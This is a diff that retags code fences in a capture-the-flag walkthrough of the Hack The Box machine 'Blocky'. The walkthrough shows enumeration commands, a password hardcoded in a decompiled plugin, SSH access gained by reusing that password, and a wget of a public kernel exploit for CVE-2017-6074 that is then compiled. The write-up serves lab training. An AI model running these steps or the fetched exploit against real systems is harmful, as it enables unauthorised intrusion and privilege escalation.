@@ -37,11 +37,11 @@ Cool, we've got ftp (21), ssh (22) and http (80)
 ## Identification
 Let's take a quick look at the headers on the web server
 
-```
+```shell_session
 curl -I 10.10.10.37
 ```
 
-```
+```http
 HTTP/1.1 200 OK
 Server: Apache/2.4.18 (Ubuntu)
 Link: <http://10.10.10.37/index.php/wp-json/>; rel="https://api.w.org/"
@@ -58,7 +58,7 @@ Version 4.8.0 is affected by [a handful of vulnerabilities](https://wpvulndb.com
 ## Enumeration
 Let's do some directory enumeration...
 
-```
+```shell_session
 uniscan -q -u http://10.10.10.37/
 ```
 
@@ -108,13 +108,13 @@ http://10.10.10.37/plugins/files/BlockyCore.jar
 
 http://10.10.10.37/plugins/files/griefprevention-1.11.2-3.1.1.298.jar
 
-```
+```shell_session
 jar -xf BlockyCore.jar
 cd com/myfirstplugin/
 Jad BlockyCore.class
 ```
 Found:
-```
+```java
 sqlHost = "localhost";
 sqlUser = "root";
 sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
@@ -128,7 +128,7 @@ Check password against other users seen in db
 
 One user in wp_users
 
-```
+```sql
 Notch $P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/ notch notch@blockcraftfake.com
 ```
 
@@ -139,19 +139,19 @@ Could also have used CVE-2016-5734 on PHPMyAdmin to get a shell.
 
 Testing password over ssh
 
-```
+```shell_session
 ssh root@10.10.10.37
 ```
 
 Failed no pw reuse
 
-```
+```shell_session
 ssh notch@10.10.10.37
 ```
 
 total success
 
-```
+```shell_session
 Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
 * Documentation: https://help.ubuntu.com
 * Management: https://landscape.canonical.com
@@ -164,7 +164,7 @@ Last login: Sun Oct 29 11:09:42 2017 from 10.10.14.13
 ## Privilege Escalation
 At this point we have the user flag, now let's get that root flag.
 
-```
+```shell_session
 notch@Blocky:~$ uname -r
 4.4.0-62-generic
 ```
@@ -173,11 +173,11 @@ notch@Blocky:~$ uname -r
 Kernel 4.4.0-62-generic is impacted by [CVE-2017-6074](https://www.cvedetails.com/cve/CVE-2017-6074/)
 
 On local machine
-```
+```shell_session
 wget https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-6074/poc.c
 ```
 
-```
+```shell_session
 gcc poc.c -o pwn
 ```
 
